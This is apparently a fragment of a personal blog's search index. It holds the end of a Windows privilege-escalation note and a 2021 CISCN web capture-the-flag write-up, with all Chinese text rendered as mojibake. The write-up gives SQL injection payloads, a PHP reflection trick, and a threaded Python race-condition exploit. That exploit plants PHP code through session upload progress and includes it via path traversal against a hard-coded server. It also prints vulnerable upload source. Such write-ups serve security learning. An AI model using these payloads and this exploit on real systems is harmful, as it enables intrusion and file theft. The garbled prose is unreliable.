è¿˜å†…ç½®äº† local_expoit_suggester æ¨¡å—ï¼Œå¯ä»¥ç”¨äºå¿«é€Ÿè¯†åˆ«ç³»ç»Ÿä¸­å¯èƒ½è¢«åˆ©ç”¨çš„æ¼æ´</p><h4 id="PowerShell-çš„-Sherlock-è„šæœ¬"><a href="#PowerShell-çš„-Sherlock-è„šæœ¬" class="headerlink" title="PowerShell çš„ Sherlock è„šæœ¬"></a>PowerShell çš„ Sherlock è„šæœ¬</h4><p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> sherlock.ps1</span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure><h3 id="Windows-æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨åˆ†æ"><a href="#Windows-æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨åˆ†æ" class="headerlink" title="Windows æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨åˆ†æ"></a>Windows æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨åˆ†æ</h3><h4 id="ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"><a href="#ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯" class="headerlink" title="ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"></a>ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯</h4><p>ç³»ç»ŸæœåŠ¡æƒé™é…ç½®æ¼æ´ï¼ˆå¯å†™ç›®å½•æ¼æ´ï¼‰æœ‰å¦‚ä¸‹ä¸¤ç§å¯èƒ½</p><ul><li>æœåŠ¡æœªè¿è¡Œï¼šæ”»å‡»è€…ä¼šä½¿ç”¨ä»»æ„æœåŠ¡æ›¿æ¢åŸæ¥çš„æœåŠ¡ï¼Œç„¶åé‡å¯æœåŠ¡</li><li>æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•è¢«ç»ˆæ­¢ï¼šè¿™ç§æƒ…å†µç¬¦åˆç»å¤§å¤šæ•°çš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨ DLL åŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡æ¥ææƒ</li></ul><h3 id="ææƒè¿™é‡Œå…ˆé¸½äº†ï¼Œå±å®ä¸çŸ¥é“æ€ä¹ˆå†™"><a href="#ææƒè¿™é‡Œå…ˆé¸½äº†ï¼Œå±å®ä¸çŸ¥é“æ€ä¹ˆå†™" class="headerlink" title="ææƒè¿™é‡Œå…ˆé¸½äº†ï¼Œå±å®ä¸çŸ¥é“æ€ä¹ˆå†™"></a>ææƒè¿™é‡Œå…ˆé¸½äº†ï¼Œå±å®ä¸çŸ¥é“æ€ä¹ˆå†™</h3><h2 id="åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æåŠé˜²å¾¡"><a href="#åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æåŠé˜²å¾¡" class="headerlink" title="åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æåŠé˜²å¾¡"></a>åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æåŠé˜²å¾¡</h2><h3 id="å¸¸ç”¨-Windows-è¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤"><a href="#å¸¸ç”¨-Windows-è¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤" class="headerlink" title="å¸¸ç”¨ Windows è¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤"></a>å¸¸ç”¨ Windows è¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤</h3>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è‚¾é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CISCN_WEB_WP</title>
      <link href="2021/05/15/2021-CISCN-WEB-WP/"/>
      <url>2021/05/15/2021-CISCN-WEB-WP/</url>
      
        <content type="html"><![CDATA[<p>å›½èµ›ã€‚</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>æ— åˆ—åã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e)) %23</span><br><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select &#96;4a9ad912-9910-4909-82f4-0fe381be9798&#96; from flag),0x7e)) %23</span><br><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select substr((select &#96;4a9ad912-9910-4909-82f4-0fe381be9798&#96;  from flag),12)),0x7e)) %23</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>åŸé¢˜ï¼Œ<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>swo æºç æ³„éœ²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">æœ¬é¢˜ç›®æ²¡æœ‰å…¶ä»–ä»£ç äº†å™¢ï¼Œå°±åªæœ‰è¿™ä¸€ä¸ªæ–‡ä»¶ï¼Œè™½ç„¶ä½ çœ‹åˆ°çš„ä¸å®Œå…¨ï¼Œä½†æ˜¯ä½ è§‰å¾—æˆ‘ä¼šæŠŠflagè—åœ¨å“ªé‡Œå‘¢ï¼Œä»”ç»†æƒ³æƒ³æ–‡ä»¶é‡Œé¢è¿˜æœ‰ä»€ä¹ˆï¼Ÿ</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>çŒœæµ‹ flag è—åœ¨ç±»æ³¨é‡Šä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ php å†…ç½®ç±» <code>ReflectionMethod</code> çš„ <code>getDocComment</code> å‡½æ•°æ¥è¯»å– User ç±»ä¸­å„ä¸ªå‡½æ•°çš„æ³¨é‡Šï¼Œå¯ä»¥æ„é€ ï¼š <code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code>ï¼ˆè¿™é‡Œç”¨ <code>__toString</code> ä¹Ÿå½³äºï¼‰</p><p>é€ä¸ªå‡½æ•°çˆ†ç ´ï¼š</p><p><img src="https://i.loli.net/2021/05/15/uEINUml17zMovrd.png"></p><p>flag åœ¨ q é‡Œé¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;TpVpe-HP8w2-3kFCF-4EZTO-hyAy0-&#125;</span><br></pre></td></tr></table></figure><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>.listing ä¿¡æ¯æœé›†ï¼Œsession.upload_progress æ–‡ä»¶åŒ…å«åˆ©ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sessid = <span class="string">&#x27;233333333333&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/acafaecced/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/fl444444g&quot;)); ?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;help.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">        <span class="comment"># resp = session.post(&#x27;http://123.60.215.249:25900/&#x27;, data=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php var_dump(</span></span><br><span class="line">        <span class="comment"># scandir(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/&quot;)); ?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;help.txt&#x27;,</span></span><br><span class="line">        <span class="comment"># f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>, data=data)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>flagï¼šCISCN{FhDKa-MuU0P-FJ9lj-MsZcg-6hXCa-}</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>example.php æºç æ³„éœ²ã€‚</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>example.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span 